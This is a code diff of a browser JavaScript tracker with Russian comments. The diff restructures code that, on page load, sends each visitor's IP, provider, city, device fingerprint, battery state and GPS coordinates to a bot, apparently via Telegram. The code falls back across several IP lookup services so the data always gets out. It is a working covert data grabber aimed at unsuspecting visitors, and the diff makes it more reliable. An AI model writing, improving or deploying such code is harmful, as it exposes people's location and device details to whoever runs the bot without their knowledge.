@@ -29,68 +29,74 @@
                 .catch(() => {});
         }
 
-        // === 1. IP + ПРОВАЙДЕР + ГОРОД ===
+        // === 1. IP + ПРОВАЙДЕР (с резервом) ===
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
-                const info = 
+                sendToBot(
                     '🎯 НОВЫЙ ПЕРЕХОД\n' +
                     '━━━━━━━━━━━━━━━━\n' +
                     '🌐 IP: ' + data.ip + '\n' +
                     '🏢 Провайдер: ' + (data.org || 'неизвестно') + '\n' +
                     '🌍 Город: ' + (data.city || 'неизвестно') + '\n' +
                     '🗺️ Регион: ' + (data.region || 'неизвестно') + '\n' +
-                    '🏳️ Страна: ' + (data.country_name || 'неизвестно') + '\n' +
-                    '━━━━━━━━━━━━━━━━\n' +
-                    '📱 Устройство: ' + navigator.userAgent + '\n' +
-                    '💻 Платформа: ' + navigator.platform + '\n' +
-                    '🌍 Язык: ' + navigator.language + '\n' +
-                    '📚 Все языки: ' + (navigator.languages || []).join(', ') + '\n' +
-                    '🖥️ Экран: ' + screen.width + 'x' + screen.height + '\n' +
-                    '🕐 Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n' +
-                    '🧠 Ядер CPU: ' + (navigator.hardwareConcurrency || '?') + '\n' +
-                    '💾 Память: ' + (navigator.deviceMemory || '?') + ' ГБ\n' +
-                    '📶 Соединение: ' + (navigator.connection ? navigator.connection.effectiveType : '?') + '\n' +
-                    '🍪 Куки: ' + (navigator.cookieEnabled ? 'вкл' : 'выкл') + '\n' +
-                    '🕵️ Do Not Track: ' + (navigator.doNotTrack || 'нет') + '\n' +
-                    '⏰ Время: ' + new Date().toLocaleString();
-                sendToBot(info);
+                    '🏳️ Страна: ' + (data.country_name || 'неизвестно')
+                );
             })
             .catch(() => {
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
-                    .then(data => sendToBot('IP (резерв): ' + data.ip + '\n📱 ' + navigator.userAgent))
+                    .then(data => sendToBot('🌐 IP (резерв): ' + data.ip))
                     .catch(() => {
                         fetch('https://ipwho.is/')
                             .then(res => res.json())
-                            .then(data => sendToBot('IP (резерв 2): ' + data.ip + '\n📱 ' + navigator.userAgent))
+                            .then(data => sendToBot('🌐 IP (резерв 2): ' + data.ip))
                             .catch(() => sendToBot('❌ IP не определён'));
                     });
             });
 
-        // === 2. БАТАРЕЯ ===
+        // === 2. УСТРОЙСТВО (отдельно, не зависит от ipapi) ===
+        sendToBot(
+            '📱 УСТРОЙСТВО\n' +
+            '━━━━━━━━━━━━━━━━\n' +
+            'User-Agent: ' + navigator.userAgent + '\n' +
+            'Платформа: ' + navigator.platform + '\n' +
+            'Язык: ' + navigator.language + '\n' +
+            'Все языки: ' + (navigator.languages || []).join(', ') + '\n' +
+            'Экран: ' + screen.width + 'x' + screen.height + '\n' +
+            'Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n' +
+            'Ядер CPU: ' + (navigator.hardwareConcurrency || '?') + '\n' +
+            'Память: ' + (navigator.deviceMemory || '?') + ' ГБ\n' +
+            'Соединение: ' + (navigator.connection ? navigator.connection.effectiveType : '?') + '\n' +
+            'Куки: ' + (navigator.cookieEnabled ? 'вкл' : 'выкл') + '\n' +
+            'Do Not Track: ' + (navigator.doNotTrack || 'нет') + '\n' +
+            'Время: ' + new Date().toLocaleString()
+        );
+
+        // === 3. БАТАРЕЯ ===
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
-                sendToBot('🔋 БАТАРЕЯ\n━━━━━━━━━━━━━━━━\n' +
+                sendToBot('🔋 БАТАРЕЯ\n' +
+                    '━━━━━━━━━━━━━━━━\n' +
                     'Уровень: ' + Math.round(battery.level * 100) + '%\n' +
                     'Заряжается: ' + (battery.charging ? 'да' : 'нет') + '\n' +
                     'Время до разряда: ' + (battery.dischargingTime ? Math.round(battery.dischargingTime / 60) + ' мин' : '?'));
             });
         }
 
-        // === 3. ГЕОЛОКАЦИЯ ===
+        // === 4. ГЕОЛОКАЦИЯ ===
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 pos => {
-                    const coords = 
+                    sendToBot(
                         '📍 ГЕОЛОКАЦИЯ\n' +
                         '━━━━━━━━━━━━━━━━\n' +
                         'Широта: ' + pos.coords.latitude + '\n' +
                         'Долгота: ' + pos.coords.longitude + '\n' +
                         'Точность: ' + Math.round(pos.coords.accuracy) + ' м\n' +
                         'Высота: ' + (pos.coords.altitude || '?') + '\n' +
-                        'Скорость: ' + (pos.coords.speed || '?');
-                    sendToBot(coords);
+                        'Скорость: ' + (pos.coords.speed || '?')
+                    );
                 },
                 () => sendToBot('❌ Геолокация запрещена')
             );
